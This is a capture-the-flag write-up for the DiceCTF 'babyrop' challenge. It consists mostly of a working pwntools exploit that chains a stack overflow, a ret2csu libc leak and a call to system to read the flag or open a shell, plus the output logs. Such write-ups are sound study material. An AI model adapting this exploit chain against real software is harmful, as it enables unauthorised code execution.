## pwn/babyrop

```
joshdabosh
115 solves / 125 points

"FizzBuzz101: Who wants to write a ret2libc"

nc dicec.tf 31924
```

Tags: _pwn_ _x86-64_ _ret2libc_ _ret2csu_ _rop_ _bof_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babyrop')
context.log_level = 'INFO'

if args.REMOTE:
	p = remote('dicec.tf', 31924)
	# got lucky, its ubuntu 20.04, didnt need to search
	libc = binary.libc
else:
	p = process(binary.path)
	libc = binary.libc

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

# get to return address
payload  = b''
payload += 0x48 * b'A'

# csu
'''
  4011b0:       4c 89 f2                mov    rdx,r14
  4011b3:       4c 89 ee                mov    rsi,r13
  4011b6:       44 89 e7                mov    edi,r12d
  4011b9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4011bd:       48 83 c3 01             add    rbx,0x1
  4011c1:       48 39 dd                cmp    rbp,rbx
  4011c4:       75 ea                   jne    4011b0 <__libc_csu_init+0x40>
  4011c6:       48 83 c4 08             add    rsp,0x8
  4011ca:       5b                      pop    rbx
  4011cb:       5d                      pop    rbp
  4011cc:       41 5c                   pop    r12
  4011ce:       41 5d                   pop    r13
  4011d0:       41 5e                   pop    r14
  4011d2:       41 5f                   pop    r15
  4011d4:       c3                      ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x4011ca

payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)
payload += p64(1)
payload += p64(1)
payload += p64(binary.got.write)
payload += p64(8)
payload += p64(binary.got.write)

set_rdx_rsi_rdi_call_r15 = 0x4011b0

# this will call write
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += 7 * p64(0) # add rsp,0x8, 6 pops at end

# loop back works
payload += p64(binary.sym.main)

p.sendlineafter('Your name: ',payload)

_ = p.recv(8)
write = u64(_)
log.info('write: ' + hex(write))

# find libc here
libc.address = write - libc.sym.write
log.info('libc.address: ' + hex(libc.address))

# now a flag/shell
payload  = b''
payload += 0x48 * b'A'

#'''
# option 1
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(binary.plt.gets)
# get the flag
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(libc.sym.system)

p.sendlineafter('Your name: ',payload)
p.sendline('cat flag.txt\0')
p.stream()
'''
# option 2
# get a shell
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh\0').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('Your name: ',payload)
p.interactive()
'''
```

Output (option 1):

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dicectf2021/babyrop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dicec.tf on port 31924: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './babyrop'
[*] write: 0x7effa4a9c1d0
[*] libc.address: 0x7effa498b000
dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}
```

Output (option 2):

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dicectf2021/babyrop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dicec.tf on port 31924: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './babyrop'
[*] write: 0x7faaeff021d0
[*] libc.address: 0x7faaefdf1000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ cat flag.txt
dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}
```
